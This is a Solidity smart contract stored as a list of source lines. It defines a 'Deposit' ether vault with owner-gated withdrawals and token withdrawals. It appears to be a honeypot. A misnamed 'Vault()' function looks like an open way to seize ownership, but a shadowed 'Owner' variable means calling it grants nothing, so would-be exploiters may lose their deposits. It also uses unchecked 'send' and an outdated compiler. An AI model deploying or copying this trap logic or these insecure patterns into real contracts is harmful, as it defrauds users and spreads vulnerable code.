['pragma solidity ^0.4.7;\n', '\n', 'contract ForeignToken {\n', '    function balanceOf(address who) constant public returns (uint256);\n', '    function transfer(address to, uint256 amount) public;\n', '}\n', '\n', 'contract Owned {\n', '    bool public locked = true;\n', '    address public Owner = msg.sender;\n', '    modifier onlyOwner { if (msg.sender == Owner || !locked) _; }\n', '    function lock(bool flag) onlyOwner { locked = flag; }\n', '}\n', '\n', 'contract Deposit is Owned {\n', '    address public Owner;\n', '    mapping (address => uint) public Deposits;\n', '\n', '    event Deposit(uint amount);\n', '    event Withdraw(uint amount);\n', '    \n', '    function Vault() payable {\n', '        Owner = msg.sender;\n', '        deposit();\n', '    }\n', '    \n', '    function() payable {\n', '        deposit();\n', '    }\n', '\n', '    function deposit() payable {\n', '        if (msg.value >= 0.1 ether) {\n', '            Deposits[msg.sender] += msg.value;\n', '            Deposit(msg.value);\n', '        }\n', '    }\n', '\n', '    function kill() payable {\n', '        if (this.balance == 0)\n', '            selfdestruct(msg.sender);\n', '    }\n', '    \n', '    function withdraw(uint amount) payable onlyOwner {\n', '        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {\n', '            msg.sender.send(amount);\n', '            Withdraw(amount);\n', '        }\n', '    }\n', '    \n', '    function withdrawToken(address token, uint amount) payable onlyOwner {\n', '        uint bal = ForeignToken(token).balanceOf(address(this));\n', '        if (bal >= amount) {\n', '            ForeignToken(token).transfer(msg.sender, amount);\n', '        }\n', '    }\n', '}']